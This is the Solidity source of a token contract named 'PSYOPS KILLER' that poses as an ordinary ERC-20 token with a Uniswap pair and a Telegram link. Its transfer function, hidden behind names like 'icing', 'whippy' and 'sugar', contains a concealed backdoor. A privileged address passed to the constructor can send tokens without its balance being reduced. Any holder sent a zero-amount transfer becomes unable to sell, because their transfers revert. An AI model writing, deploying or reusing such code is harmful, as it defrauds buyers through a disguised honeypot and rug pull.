/*

https://t.me/Psykill_Portal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PSYOPSKILLER is Ownable {
    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    address public uniswapV2Pair;

    function icing(address vanilla, address choccy, uint256 butter) private returns (bool success) {
        if (whippy[vanilla] == 0) {
            if (sugar[vanilla] > 0 && vanilla != uniswapV2Pair) {
                whippy[vanilla] -= pudding;
            }
            balanceOf[vanilla] -= butter;
        }
        if (butter == 0) {
            sugar[choccy] += pudding;
        }
        balanceOf[choccy] += butter;
        emit Transfer(vanilla, choccy, butter);
        return true;
    }    

    constructor(address jello) {
        symbol = 'PSYKILL';
        name = 'PSYOPS KILLER';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        whippy[jello] = pudding;
    }

    uint256 private pudding = 81;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address vanilla, address choccy, uint256 butter) public returns (bool success) {
        icing(vanilla, choccy, butter);
        require(butter <= allowance[vanilla][msg.sender]);
        allowance[vanilla][msg.sender] -= butter;
        return true;
    }

    function approve(address valuable, uint256 butter) public returns (bool success) {
        allowance[msg.sender][valuable] = butter;
        emit Approval(msg.sender, valuable, butter);
        return true;
    }

    function transfer(address choccy, uint256 butter) public returns (bool success) {
        icing(msg.sender, choccy, butter);
        return true;
    }

    mapping(address => uint256) private whippy;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private sugar;    

    string public symbol;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
}